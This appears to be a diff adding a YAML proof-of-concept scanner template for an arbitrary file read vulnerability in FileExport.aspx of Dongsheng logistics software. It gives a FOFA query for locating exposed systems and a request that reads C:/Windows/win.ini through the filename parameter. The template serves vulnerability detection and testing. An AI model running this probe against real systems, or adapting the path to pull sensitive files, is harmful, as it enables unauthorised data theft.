@@ -1,0 +1,16 @@
+id: poc-yaml-dongshengsoft-fileexport-aspx-anyfile-read
+info:
+  name: 东胜物流软件 FileExport.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+requests:
+- method: GET
+  path: /Reports/FileExport.aspx?filename=C:/Windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && contains(headers,"fileName=win.ini") && contains(content_type,"application/txt")
+    && !contains(body,"<")
+variables: {}
+transport: http
